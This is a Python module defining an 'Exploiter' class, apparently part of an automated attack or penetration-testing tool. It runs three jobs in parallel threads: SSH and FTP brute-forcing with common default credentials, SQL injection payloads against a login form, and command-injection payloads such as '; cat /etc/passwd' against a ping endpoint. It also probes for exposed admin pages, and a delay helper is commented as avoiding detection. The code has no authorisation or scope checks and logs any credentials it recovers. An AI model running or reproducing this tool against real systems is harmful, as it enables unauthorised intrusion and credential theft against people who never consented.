import requests
import socket
import paramiko
import ftplib
from concurrent.futures import ThreadPoolExecutor
import time

class Exploiter:
    def __init__(self, target, logger):
        self.target = target
        self.logger = logger
        self.results = []
        self.common_passwords = ['admin', 'password', '123456', 'root', 'toor']
        self.common_users = ['admin', 'root', 'user', 'test']

    def run_exploits(self):
        self.logger.info("Starting exploitation phase...")
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            executor.submit(self._brute_force_ssh)
            executor.submit(self._brute_force_ftp)
            executor.submit(self._exploit_web_vulns)
        
        return self.results

    def _brute_force_ssh(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for user in self.common_users:
            for password in self.common_passwords:
                try:
                    ssh.connect(self.target, username=user, password=password, timeout=3)
                    self.results.append({
                        'type': 'SSH Breach',
                        'description': f'Successfully logged in with {user}:{password}',
                        'severity': 'Critical',
                        'credentials': {'user': user, 'password': password}
                    })
                    ssh.close()
                    return
                except:
                    continue

    def _brute_force_ftp(self):
        for user in self.common_users:
            for password in self.common_passwords:
                try:
                    ftp = ftplib.FTP(self.target)
                    ftp.login(user, password)
                    self.results.append({
                        'type': 'FTP Breach',
                        'description': f'Successfully logged in with {user}:{password}',
                        'severity': 'Critical',
                        'credentials': {'user': user, 'password': password}
                    })
                    ftp.quit()
                    return
                except:
                    continue

    def _exploit_web_vulns(self):
        self._try_sql_injection()
        self._try_command_injection()
        self._check_default_pages()

    def _try_sql_injection(self):
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin' --",
            "' OR 1=1#"
        ]
        
        for payload in payloads:
            try:
                r = requests.post(f"http://{self.target}/login", 
                                data={'username': payload, 'password': payload},
                                timeout=5)
                
                if 'admin' in r.text.lower() or 'dashboard' in r.text.lower():
                    self.results.append({
                        'type': 'SQL Injection',
                        'description': f'Successful SQL injection with payload: {payload}',
                        'severity': 'Critical',
                        'payload': payload
                    })
            except:
                continue

    def _try_command_injection(self):
        payloads = [
            "; cat /etc/passwd",
            "| dir",
            "; whoami",
            "& netstat -an"
        ]
        
        for payload in payloads:
            try:
                r = requests.get(f"http://{self.target}/ping?host=localhost{payload}")
                if any(keyword in r.text.lower() for keyword in ['root:', 'system32', 'listening']):
                    self.results.append({
                        'type': 'Command Injection',
                        'description': f'Successful command injection with: {payload}',
                        'severity': 'Critical',
                        'payload': payload
                    })
            except:
                continue

    def _check_default_pages(self):
        default_paths = [
            '/phpmyadmin/',
            '/admin/',
            '/wp-admin/',
            '/jenkins/',
            '/manager/html'
        ]
        
        for path in default_paths:
            try:
                r = requests.get(f"http://{self.target}{path}")
                if r.status_code == 200:
                    self.results.append({
                        'type': 'Default Page',
                        'description': f'Default admin page found: {path}',
                        'severity': 'High',
                        'url': f"http://{self.target}{path}"
                    })
            except:
                continue

    def _rate_limit(self):
        time.sleep(0.5)  # Basic rate limiting to avoid detection
